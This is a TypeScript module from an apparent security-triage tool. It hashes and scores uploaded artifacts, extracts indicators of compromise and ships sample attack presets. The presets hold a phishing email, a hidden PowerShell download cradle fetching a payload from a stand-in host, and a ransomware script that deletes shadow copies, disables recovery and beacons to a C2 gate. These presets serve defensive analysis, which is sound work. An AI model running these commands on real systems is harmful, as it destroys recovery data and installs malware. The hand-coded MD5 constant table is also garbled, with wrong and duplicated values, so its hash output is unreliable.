import { classifyIoc, normalizeIp, normalizeUrl, normalizeEmail, normalizeDomain } from "@/lib/extraction/normalize";
import { refang } from "@/lib/ioc-patterns";

export type ArtifactKind =
  | "email"
  | "pcap"
  | "log"
  | "binary"
  | "script"
  | "document"
  | "archive"
  | "url-list"
  | "raw-text";

export interface IntakeObservable {
  kind: "ip" | "domain" | "url" | "email" | "hash" | "command";
  value: string;
  defanged: string;
  meta?: string;
}

export interface IntakeDigest {
  fileName: string;
  fileSize: number;
  kind: ArtifactKind;
  mimeType: string;
  sha256: string;
  md5: string;
  entropy: number;
  entropyLabel: string;
  entropyRisk: "low" | "medium" | "high";
  preview: string;
  isBinary: boolean;
  observables: IntakeObservable[];
  recommendedRoute: {
    path: string;
    label: string;
    intent: string;
  };
}

/* ── MD5 implementation ───────────────────────────────────── */
const MD5_K = new Int32Array([
  -680876936, -389564586,  606105819, -1044525330, -176418897,  1200080426,
  -1473231341,  -45705983,  433451502,  -196783582,  -630245849,   650445775,
  -18750611,  -7434520,  1423445472, -1894986606,  -1051523, -2054922799,
  1873313359,  -30611744, -1560198380,  1309151649, -145523070,  -1120210379,
  718787259,  -343485551,  -874433291,   170877005, -338873413, -1700485571,
  1272893353,  -165338658,  -1094730640,  1839030562,  -26795859, -2050433606,
  1628541399,  -192520776,  -1524803725,  135198194, -1694986540, -118534312,
  75704558,  -35309556,  -643717713,   392106999, -289128836, -1868039412,
  1235123992,  -142453499,  -1017496296,  1804603682,  -48347078, -1961240498,
  1435230414,  -288645,  -392106999,  -6267207, -1178335552,   1634567,
  -2022574463,  1839030562,  -619089, -1926607734,
]);

const MD5_S = [
  7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
  5,  9, 14, 20, 5,  9, 14, 20, 5,  9, 14, 20, 5,  9, 14, 20,
  4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
  6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21,
];

export function computeMd5Hex(data: Uint8Array | string): string {
  const bytes = typeof data === "string" ? new TextEncoder().encode(data) : data;
  const ml = bytes.length * 8;
  const paddedLen = (((bytes.length + 8) >> 6) << 6) + 64;
  const padded = new Uint8Array(paddedLen);
  padded.set(bytes);
  padded[bytes.length] = 0x80;
  const dv = new DataView(padded.buffer);
  dv.setUint32(paddedLen - 8, ml >>> 0, true);
  dv.setUint32(paddedLen - 4, Math.floor(ml / 0x100000000), true);
  let a0 = 0x67452301, b0 = 0xefcdab89, c0 = 0x98badcfe, d0 = 0x10325476;
  for (let off = 0; off < paddedLen; off += 64) {
    const M = new Int32Array(16);
    for (let i = 0; i < 16; i++) M[i] = dv.getInt32(off + i * 4, true);
    let A = a0, B = b0, C = c0, D = d0;
    for (let i = 0; i < 64; i++) {
      let F: number, g: number;
      if (i < 16) { F = (B & C) | (~B & D); g = i; }
      else if (i < 32) { F = (D & B) | (~D & C); g = (5 * i + 1) % 16; }
      else if (i < 48) { F = B ^ C ^ D; g = (3 * i + 5) % 16; }
      else { F = C ^ (B | ~D); g = (7 * i) % 16; }
      F = (F + A + MD5_K[i] + M[g]) | 0;
      A = D; D = C; C = B;
      B = (B + ((F << MD5_S[i]) | (F >>> (32 - MD5_S[i])))) | 0;
    }
    a0 = (a0 + A) | 0; b0 = (b0 + B) | 0; c0 = (c0 + C) | 0; d0 = (d0 + D) | 0;
  }
  const out = new DataView(new ArrayBuffer(16));
  out.setInt32(0, a0, true); out.setInt32(4, b0, true); out.setInt32(8, c0, true); out.setInt32(12, d0, true);
  return [...new Uint8Array(out.buffer)].map((b) => b.toString(16).padStart(2, "0")).join("");
}

export async function computeSha256Hex(data: Uint8Array | string): Promise<string> {
  const bytes = typeof data === "string" ? new TextEncoder().encode(data) : data;
  const hashBuffer = await crypto.subtle.digest("SHA-256", bytes.buffer as ArrayBuffer);
  return [...new Uint8Array(hashBuffer)].map((b) => b.toString(16).padStart(2, "0")).join("");
}

export function computeShannonEntropy(data: Uint8Array | string): number {
  const bytes = typeof data === "string" ? new TextEncoder().encode(data) : data;
  if (bytes.length === 0) return 0;
  const freq = new Map<number, number>();
  for (let i = 0; i < bytes.length; i++) {
    freq.set(bytes[i], (freq.get(bytes[i]) || 0) + 1);
  }
  let entropy = 0;
  const len = bytes.length;
  for (const count of freq.values()) {
    const p = count / len;
    entropy -= p * Math.log2(p);
  }
  return Number(entropy.toFixed(3));
}

export function classifyEntropy(entropy: number): { label: string; risk: "low" | "medium" | "high" } {
  if (entropy < 3.5) return { label: "Low (Sparse / Uniform Data)", risk: "low" };
  if (entropy < 6.0) return { label: "Moderate (Standard Text / Code / JSON)", risk: "low" };
  if (entropy < 7.2) return { label: "High (Compressed / Packed Assembly)", risk: "medium" };
  return { label: "Critical (Heavily Encrypted / Obfuscated Payload)", risk: "high" };
}

export function detectArtifactKind(fileName: string, mimeType: string, contentSample: string): ArtifactKind {
  const ext = fileName.includes(".") ? fileName.split(".").pop()?.toLowerCase() ?? "" : "";

  if (["eml", "msg"].includes(ext) || mimeType.includes("message/rfc822") || contentSample.includes("Received: by") || contentSample.includes("X-Mailer:")) {
    return "email";
  }
  if (["pcap", "pcapng", "cap"].includes(ext) || mimeType.includes("pcap")) {
    return "pcap";
  }
  if (["log", "json", "syslog", "csv", "tsv", "xml"].includes(ext) || contentSample.startsWith("{") || contentSample.startsWith("[") || contentSample.includes("CEF:") || contentSample.includes("LEEF:")) {
    return "log";
  }
  if (["exe", "dll", "sys", "bin", "elf", "macho", "dylib", "iso"].includes(ext)) {
    return "binary";
  }
  if (["ps1", "vbs", "bat", "cmd", "sh", "bash", "py", "js", "ts", "pl"].includes(ext)) {
    return "script";
  }
  if (["pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "rtf"].includes(ext)) {
    return "document";
  }
  if (["zip", "tar", "gz", "7z", "rar", "bz2"].includes(ext)) {
    return "archive";
  }
  if (contentSample.split("\n").filter((l) => /^https?:\/\//i.test(l.trim())).length > 3) {
    return "url-list";
  }
  return "raw-text";
}

export function getRecommendedRoute(kind: ArtifactKind): { path: string; label: string; intent: string } {
  switch (kind) {
    case "email":
      return { path: "/phishing", label: "Open in Phishing & Email Workbench", intent: "Dissect RFC-822 headers, SPF/DKIM authentication, and embedded lure links." };
    case "pcap":
      return { path: "/pcap", label: "Open in PCAP Inspector", intent: "Reassemble TCP streams, DNS queries, and TLS handshakes." };
    case "log":
      return { path: "/logs", label: "Open in Log File Analyzer", intent: "Filter, normalize, and correlate multi-line log events." };
    case "binary":
    case "script":
    case "document":
    case "archive":
      return { path: "/file", label: "Open in File & Binary Forensics", intent: "Inspect PE headers, suspicious strings, section entropy, and hash intelligence." };
    case "url-list":
      return { path: "/url", label: "Open in URL Dissector", intent: "Bulk redirect tracing, domain reputation, and credential lure inspection." };
    default:
      return { path: "/chef", label: "Open in CyberChef Workbench", intent: "Deobfuscate, base64 decode, and transform raw text." };
  }
}

export function extractArtifactObservables(text: string): IntakeObservable[] {
  const out: IntakeObservable[] = [];
  const seen = new Set<string>();

  // IPs
  const ipMatches = text.matchAll(/\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b/g);
  for (const m of ipMatches) {
    const ip = m[0];
    if (ip.startsWith("0.") || ip.startsWith("127.")) continue;
    if (!seen.has(ip)) {
      seen.add(ip);
      const isPriv = /^(?:10\.|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.)/.test(ip);
      out.push({
        kind: "ip",
        value: ip,
        defanged: ip.replace(/\./g, "[.]"),
        meta: isPriv ? "RFC1918 Private" : "Public IPv4",
      });
    }
  }

  // URLs
  const urlMatches = text.matchAll(/https?:\/\/[^\s"'<>\)\]]+/gi);
  for (const m of urlMatches) {
    const url = m[0];
    if (!seen.has(url)) {
      seen.add(url);
      out.push({
        kind: "url",
        value: url,
        defanged: url.replace(/^http/, "hxxp").replace(/\./g, "[.]"),
      });
    }
  }

  // Emails
  const emailMatches = text.matchAll(/\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/g);
  for (const m of emailMatches) {
    const email = m[0];
    if (!seen.has(email)) {
      seen.add(email);
      out.push({
        kind: "email",
        value: email,
        defanged: email.replace("@", "[at]"),
      });
    }
  }

  // Hashes (SHA-256 / MD5)
  const hashMatches = text.matchAll(/\b[a-f0-9]{32,64}\b/gi);
  for (const m of hashMatches) {
    const h = m[0].toLowerCase();
    if (h.length === 32 && !seen.has(h)) {
      seen.add(h);
      out.push({ kind: "hash", value: h, defanged: h, meta: "MD5" });
    } else if (h.length === 64 && !seen.has(h)) {
      seen.add(h);
      out.push({ kind: "hash", value: h, defanged: h, meta: "SHA-256" });
    }
  }

  // Obfuscated / PowerShell commands
  const psMatch = text.match(/(?:powershell(?:\.exe)?|cmd\.exe|certutil\.exe|mshta\.exe)[^\n\r]+/i);
  if (psMatch && !seen.has(psMatch[0])) {
    seen.add(psMatch[0]);
    out.push({
      kind: "command",
      value: psMatch[0].slice(0, 160),
      defanged: psMatch[0].slice(0, 160),
      meta: "Execution Cradle",
    });
  }

  return out.slice(0, 30);
}

export async function digestArtifact(
  fileName: string,
  rawContent: Uint8Array | string,
  mimeType = "text/plain",
): Promise<IntakeDigest> {
  const bytes = typeof rawContent === "string" ? new TextEncoder().encode(rawContent) : rawContent;
  const isBinary = bytes.some((b) => b === 0);
  const textContent = isBinary ? "" : new TextDecoder().decode(bytes);

  const [sha256, md5, entropy] = await Promise.all([
    computeSha256Hex(bytes),
    computeMd5Hex(bytes),
    computeShannonEntropy(bytes),
  ]);

  const { label: entropyLabel, risk: entropyRisk } = classifyEntropy(entropy);
  const kind = detectArtifactKind(fileName, mimeType, textContent.slice(0, 500));
  const observables = extractArtifactObservables(textContent || `${fileName} ${sha256} ${md5}`);
  const recommendedRoute = getRecommendedRoute(kind);

  const preview = isBinary
    ? `[Binary Artifact: ${bytes.length} bytes · SHA256: ${sha256}]`
    : textContent.slice(0, 1200);

  return {
    fileName,
    fileSize: bytes.length,
    kind,
    mimeType,
    sha256,
    md5,
    entropy,
    entropyLabel,
    entropyRisk,
    preview,
    isBinary,
    observables,
    recommendedRoute,
  };
}

/* ── Attack Simulation Presets ────────────────────────────── */

export interface IntakePreset {
  id: string;
  label: string;
  fileName: string;
  kind: ArtifactKind;
  description: string;
  content: string;
}

export const INTAKE_PRESETS: IntakePreset[] = [
  {
    id: "phishing-invoice",
    label: "Phishing E-Mail (.eml)",
    fileName: "invoice_9281.eml",
    kind: "email",
    description: "Spoofed executive invoice lure with open redirect and urgent payment demand",
    content: `From: "CEO Billing Portal" <billing@corp-executive-notice.xyz>
To: target-analyst@enterprise-corp.internal
Subject: URGENT: Outstanding Overdue Invoice INV-92811
Date: Mon, 14 Aug 2026 09:12:00 +0000
Message-ID: <92811a.4812@corp-executive-notice.xyz>
Received: from mail.corp-executive-notice.xyz (185.220.101.5) by mx.enterprise-corp.internal
Authentication-Results: mx.enterprise-corp.internal;
 dkim=fail header.i=@corp-executive-notice.xyz;
 spf=fail (sender IP is 185.220.101.5) smtp.mailfrom=billing@corp-executive-notice.xyz;
 dmarc=fail action=none

Please review and confirm receipt of the attached overdue invoice:
https://login.microsoftonline-verify.xyz/auth?client_id=9812&redirect=https://invoice-host.ru/doc.pdf

Failure to remit payment will result in immediate service interruption.
Remit via ACH or cryptocurrency.
Wire instructions: 194.26.29.112:8080`,
  },
  {
    id: "powershell-cradle",
    label: "PowerShell C2 Cradle (.log)",
    fileName: "sysmon_cradle_event.log",
    kind: "log",
    description: "Encoded PowerShell download cradle executing reflective staging DLL",
    content: `2026-08-14T09:25:31.000Z WIN-SRV-DC01 Microsoft-Windows-Sysmon/Operational EventID=1
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://malicious-staging.xyz/payload.ps1'); Start-Process 'C:\\Windows\\Temp\\beacon.exe'"
ParentImage: C:\\Windows\\System32\\cmd.exe
User: ENTERPRISE\\svc_backup
Hashes: MD5=d41d8cd98f00b204e9800998ecf8427e,SHA256=275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f
DestinationIp: 91.108.240.11
DestinationPort: 443`,
  },
  {
    id: "ransomware-canary",
    label: "Ransomware Script (.ps1)",
    fileName: "vss_shadow_purge.ps1",
    kind: "script",
    description: "Volume shadow copy deletion and defense evasion batch script",
    content: `# Canary Ransomware Stage 1 - Inhibit System Recovery
vssadmin.exe delete shadows /all /quiet
wmic shadowcopy delete
bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
bcdedit.exe /set {default} recoveryenabled no
wbadmin.exe delete catalog -quiet

# Contact C2 Gate
$c2 = "http://45.33.32.156/gate.php"
$key = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("RANSOM_VICTIM_01"))
Invoke-RestMethod -Uri "$c2?id=$key" -Method Post`,
  },
  {
    id: "suricata-eve",
    label: "Suricata EVE Network Alert (.json)",
    fileName: "suricata_eve_c2.json",
    kind: "log",
    description: "High-priority Suricata TLS fingerprint alert identifying Cobalt Strike C2",
    content: JSON.stringify(
      {
        timestamp: "2026-08-14T09:40:12.000Z",
        flow_id: 1982736192837,
        event_type: "alert",
        src_ip: "10.0.1.45",
        src_port: 49822,
        dest_ip: "203.0.113.9",
        dest_port: 8443,
        proto: "TCP",
        alert: {
          action: "allowed",
          gid: 1,
          signature_id: 2024101,
          rev: 3,
          signature: "ET MALWARE Suspicious Cobalt Strike Malleable C2 Beaconing",
          category: "A Network Trojan was detected",
          severity: 1,
        },
        tls: {
          subject: "CN=major-updates.org",
          issuerdn: "CN=major-updates.org",
          fingerprint: "ba:98:e1:22:44:aa:bb:cc:dd:ee:ff:00:11:22:33:44:55:66:77:88",
          ja3: {
            hash: "ada7020ba2940b8f7928230dd608b836",
          },
        },
      },
      null,
      2,
    ),
  },
];
